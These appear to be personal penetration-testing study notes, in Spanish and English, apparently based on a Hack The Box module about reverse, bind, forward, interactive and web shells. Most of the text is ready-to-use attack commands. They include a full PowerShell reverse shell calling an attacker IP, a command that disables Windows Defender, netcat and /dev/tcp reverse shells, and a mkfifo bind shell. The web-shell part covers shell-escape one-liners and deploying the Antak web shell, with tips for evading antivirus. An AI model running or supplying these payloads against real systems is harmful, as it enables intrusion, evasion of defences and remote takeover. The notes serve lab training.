---
tags:
  - Shell
  - Conceptos
---
---
# Win

## Reverse shell

#### Servidor (`attack box`)

```shell-session
vcrdcr@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```

#### Cliente (objetivo)

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

> PUEDE QUE EL ANTIVIRUS DE WINDOWS DETENGA ESTO, POR LO QUE HABRIA QUE DESACTIVARLO

#### Deshabilitar AV

```powershell-session
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```


# Reverse Shell

**Reverse Shell**: Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndole tomar el control de la máquina remota.

## Ejemplo:

Me pongo en escucha como atacante:

```bash
nc -nlvp 443
```

Y con la maquina victima envío a la atacante una shell

```bash
nc -e /bin/bash ipAtacante 443
```

Otra opción:

```bash
bash -i >& /dev/tcp/IP/443 0>&1
```

**PARA MAS OPCIONES CON DIFERENTES LENGUAJES DE PROGRAMACIÓN:**

https://pentestmonkey.net/cheat-sheat/shells/reverse-shell-cheat-sheet

# Bind Shell

**Bind Shell**: Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.

## Ejemplo:

En la máquina victima ejecutaremos una shell en un puerto determinado

```bash
nc -nlvp 4646 -e /bin/bash
```

Con la máquina atacante nos conectamos

```bash
nc ipVictima 4646
```

## Establecimiento de un shell de enlace básico con Netcat

Hemos demostrado que podemos usar Netcat para enviar texto entre el cliente y el servidor, pero este no es un shell de enlace porque no podemos interactuar con el sistema operativo y el sistema de archivos. Solo podemos pasar texto dentro de la tubería configurada por Netcat. Usemos Netcat para servir nuestro shell y establecer un shell de enlace real.

En el lado del servidor, necesitaremos especificar el `directory`, `shell`, `listener`, trabaja con algunos `pipelines`, y `input` & `output` `redirection` para garantizar que se entregue un shell al sistema cuando el cliente intenta conectarse.

#### No. 1: Servidor: vinculación de un shell Bash a la sesión TCP

```shell-session
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

Los comandos anteriores se consideran nuestra carga útil y la entregamos manualmente. Notaremos que los comandos y el código en nuestras cargas útiles diferirán según el sistema operativo host al que los entreguemos.

De vuelta en el cliente, use Netcat para conectarse al servidor ahora que se está sirviendo un shell en el servidor.

#### No. 2: Cliente: conexión para vincular el shell al objetivo

```shell-session
vcrdcr@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$  
```



# Forward Shell

**Forward Shell**: Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.

 Normalmente la forward shell no es interactiva, para ello s4vitar tiene una script que realiza una shell interactiva:

**Repositorio de savi**
https://github.com/s4vitar/ttyoverhttp

Para que funcione tenemos que cambiarlo,
En la funcion RunCmd tenemos que cambiar en payload y en result la palabra cmd por la palabra con la que se ejecuta la shell en nuestra forward shell.


# Shell interactivas

## /bin/sh -i

This command will execute the shell interpreter specified in the path in interactive mode (`-i`).

#### Interactive

  Spawning Interactive Shells

```shell-session
/bin/sh -i
sh: no job control in this shell
sh-4.2$
```

---

## Perl

If the programming language [Perl](https://www.perl.org/) is present on the system, these commands will execute the shell interpreter specified.

#### Perl To Shell

  Spawning Interactive Shells

```shell-session
perl —e 'exec "/bin/sh";'
```

  Spawning Interactive Shells

```shell-session
perl: exec "/bin/sh";
```

The command directly above should be run from a script.

---

## Ruby

If the programming language [Ruby](https://www.ruby-lang.org/en/) is present on the system, this command will execute the shell interpreter specified:

#### Ruby To Shell

  Spawning Interactive Shells

```shell-session
ruby: exec "/bin/sh"
```

The command directly above should be run from a script.

---

## Lua

If the programming language [Lua](https://www.lua.org/) is present on the system, we can use the `os.execute` method to execute the shell interpreter specified using the full command below:

#### Lua To Shell

  Spawning Interactive Shells

```shell-session
lua: os.execute('/bin/sh')
```

The command directly above should be run from a script.

---

## AWK

[AWK](https://man7.org/linux/man-pages/man1/awk.1p.html) is a C-like pattern scanning and processing language present on most UNIX/Linux-based systems, widely used by developers and sysadmins to generate reports. It can also be used to spawn an interactive shell. This is shown in the short awk script below:

#### AWK To Shell

  Spawning Interactive Shells

```shell-session
awk 'BEGIN {system("/bin/sh")}'
```

---

## Find

[Find](https://man7.org/linux/man-pages/man1/find.1.html) is a command present on most Unix/Linux systems widely used to search for & through files and directories using various criteria. It can also be used to execute applications and invoke a shell interpreter.

#### Using Find For A Shell

  Spawning Interactive Shells

```shell-session
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

This use of the find command is searching for any file listed after the `-name` option, then it executes `awk` (`/bin/awk`) and runs the same script we discussed in the awk section to execute a shell interpreter.

---

## Using Exec To Launch A Shell

  Spawning Interactive Shells

```shell-session
find . -exec /bin/sh \; -quit
```

This use of the find command uses the execute option (`-exec`) to initiate the shell interpreter directly. If `find` can't find the specified file, then no shell will be attained.

---

## VIM

Yes, we can set the shell interpreter language from within the popular command-line-based text-editor `VIM`. This is a very niche situation we would find ourselves in to need to use this method, but it is good to know just in case.

#### Vim To Shell

  Spawning Interactive Shells

```shell-session
vim -c ':!/bin/sh'
```

#### Vim Escape

  Spawning Interactive Shells

```shell-session
vim
:set shell=/bin/sh
:shell
```

---

## Execution Permissions Considerations

In addition to knowing about all the options listed above, we should be mindful of the permissions we have with the shell session's account. We can always attempt to run this command to list the file properties and permissions our account has over any given file or binary:

#### Permissions

  Spawning Interactive Shells

```shell-session
ls -la <path/to/fileorbinary>
```

We can also attempt to run this command to check what `sudo` permissions the account we landed on has:

#### Sudo -l

  Spawning Interactive Shells

```shell-session
sudo -l
Matching Defaults entries for apache on ILF-WebSrv:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User apache may run the following commands on ILF-WebSrv:
    (ALL : ALL) NOPASSWD: ALL
```

The sudo -l command above will need a stable interactive shell to run. If you are not in a full shell or sitting in an unstable shell, you may not get any return from it. Not only will considering permissions allow us to see what commands we can execute, but it may also start to give us an idea of potential vectors that will allow us to escalate privileges.

# Web shell

## CMD

https://github.com/jbarcia/Web-Shells/tree/master/laudanum

#### Modificar la carcasa para su uso

![La imagen muestra un fragmento de código en un editor de texto. Destaca una variedad de direcciones IP permitidas, incluida "10.10.14.12". Una flecha amarilla apunta a esta línea, indicando su significado.](https://academy.hackthebox.com/storage/modules/115/modify-shell.png)

## Powershell
### Trabajando con Antak

Los archivos Antak se pueden encontrar en `/usr/share/nishang/Antak-WebShell` directorio.

```shell-session
vcrdcr@htb[/htb]$ ls /usr/share/nishang/Antak-WebShell

antak.aspx  Readme.md
```

El shell web Antak funciona como una consola Powershell. Sin embargo, ejecutará cada comando como un nuevo proceso. También puede ejecutar scripts en la memoria y codificar los comandos que envías. Como shell web, Antak es una herramienta bastante poderosa.

---

### Demostración de Antak

Ahora que entendemos qué es Antak y cómo funciona, pongámoslo a prueba contra la misma aplicación web de la sección Laudanum. Si desea seguir esta demostración, deberá agregar una entrada a su `/etc/hosts` archivo en su máquina virtual de ataque o dentro de Pwnbox para el host al que estamos atacando. Esa entrada debería decir: `<target ip> status.inlanefreight.local`. Una vez hecho esto, siempre que estés en la VPN o usando Pwnbox, también podrás jugar y explorar esta demostración.

#### Mueva una copia para modificarla

```shell-session
vcrdcr@htb[/htb]$ cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```

Asegúrese de configurar las credenciales para acceder al shell web. Modificar `line 14`, agregando un usuario (flecha verde) y una contraseña (flecha naranja). Esto entra en juego cuando navegas a tu shell web, de forma muy similar a Laudanum. Esto puede ayudar a que sus operaciones sean más seguras al garantizar que personas al azar no puedan simplemente usar el shell. Puede ser prudente eliminar el arte ASCII y los comentarios del archivo. Estos elementos en una carga útil a menudo están firmados y pueden alertar a los defensores/AV sobre lo que estás haciendo.

#### Modificar la carcasa para su uso

![La imagen muestra un fragmento de código con una declaración condicional que verifica si el nombre de usuario es "Disclaimer" y la contraseña es "ForLegitUseOnly". Si es verdadero, establece la visibilidad de la ejecución y la habilita. Las flechas verdes y naranjas resaltan las condiciones del nombre de usuario y la contraseña.](https://academy.hackthebox.com/storage/modules/115/antak-changes.png)

Para demostrar la herramienta, la subimos al mismo portal de estado que usamos para Laudanum. Ese host era un host de Windows, por lo que nuestro shell debería funcionar bien con PowerShell. Cargue el archivo y luego navegue hasta la página para usarlo. Le solicitará un usuario y una contraseña. Recuerde, con esta aplicación web, los archivos se almacenan en el `\\files\` directorio. Cuando navegas hacia el `upload.aspx` archivo, deberías ver un mensaje como el que tenemos a continuación.

#### Éxito de Shell

![La imagen muestra un formulario de inicio de sesión para Antak Webshell con campos para nombre de usuario y contraseña, ambos llenos de "htb-student". Debajo de los campos hay un botón "Iniciar sesión". La URL en la barra de direcciones del navegador es "status.inlanefreight.local/files/upload.aspx".](https://academy.hackthebox.com/storage/modules/115/antak-creds-prompt.png)

Como se ve en la siguiente imagen, se nos concederá acceso si nuestras credenciales se ingresan correctamente.

![La imagen muestra la interfaz Antak Webshell con un área de símbolo del sistema azul que muestra el mensaje: "Bienvenido a Antak, un Webshell que utiliza PowerShell. Utilice la ayuda para obtener más detalles. Utilice clear para limpiar la pantalla." A continuación se muestran botones etiquetados como "Enviar", "Explorar", "Cargar el archivo", "Codificar y ejecutar", "Descargar", "Analizar web.config", "Ejecutar consulta SQL" y un campo para ingresar una cadena de conexión.](https://academy.hackthebox.com/storage/modules/115/antak-success.png)

Ahora que tenemos acceso, podemos utilizar comandos de PowerShell para navegar y realizar acciones contra el host. Podemos emitir comandos básicos desde la ventana del shell de Antak, cargar y descargar archivos, codificar y ejecutar scripts y mucho más (flecha verde a continuación). Esta es una excelente manera de utilizar un Webshell para enviarnos una devolución de llamada a nuestra plataforma de comando y control. Podríamos cargar la carga útil a través de la función Cargar o usar una línea única de PowerShell para descargar y ejecutar el shell por nosotros. Si no está seguro de por dónde empezar, emita el comando `help` en la ventana de aviso (flecha naranja) a continuación.

#### Emisión de comandos

![La imagen muestra una ventana de símbolo del sistema que enumera archivos y directorios en dos secciones. La primera sección muestra registros en un directorio y la segunda sección enumera directorios de usuarios en "C:\Users". Debajo de la salida del comando, hay botones etiquetados "Enviar", "Explorar", "Cargar el archivo", "Codificar y ejecutar" y "Descargar" Una flecha naranja apunta al botón "Enviar" y una flecha verde apunta al botón "Codificar y ejecutar".](https://academy.hackthebox.com/storage/modules/115/antak-commands.png)

## PHP

https://github.com/WhiteWinterWolf/wwwolf-php-webshell/tree/master